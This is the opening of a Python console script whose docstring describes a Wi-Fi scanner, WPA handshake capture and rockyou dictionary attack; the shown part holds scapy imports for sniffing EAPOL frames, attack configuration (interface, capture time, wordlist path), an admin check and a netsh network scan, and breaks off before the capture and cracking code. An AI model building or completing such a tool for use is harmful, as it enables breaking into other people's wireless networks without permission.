#!/usr/bin/env python3
"""
Wi-Fi Scanner + Handshake Capture + rockyou Dictionary Attack (console version)
"""

import os
import sys
import subprocess
import time
import platform
import threading
import queue
import ctypes
try:
    from scapy.config import conf
    conf.cache = False
except:
    pass

try:
    from scapy.all import sniff, Dot11, Dot11Beacon, RadioTap, EAPOL, wrpcap
except ImportError:
    print("❌ scapy not installed! Run: pip install scapy")
    sys.exit(1)

# ================= CONFIG =================
SCAN_DURATION     = 20
CAPTURE_DURATION  = 90
OUTPUT_PCAP       = "handshake.pcap"
INTERFACE         = "wlan0"
MAX_WORKERS       = 8
ROCKYOU_PATH      = "rockyou.txt"
MAX_ROCKYOU_LINES = 100_000

stop_event   = threading.Event()
result_queue = queue.Queue()

# ─── Functions ────────────────────────────────────────────────

def is_admin():
    if platform.system() == "Windows":
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    return os.geteuid() == 0

def scan_wifi_windows():
    print("\n🔍 Scanning nearby Wi-Fi (netsh)...")
    try:
        out = subprocess.check_output(["netsh", "wlan", "show", "networks", "mode=bssid"],
                                      text=True, stderr=subprocess.STDOUT)
        print(out)
    except Exception as e:
        print(f"❌ {e}")

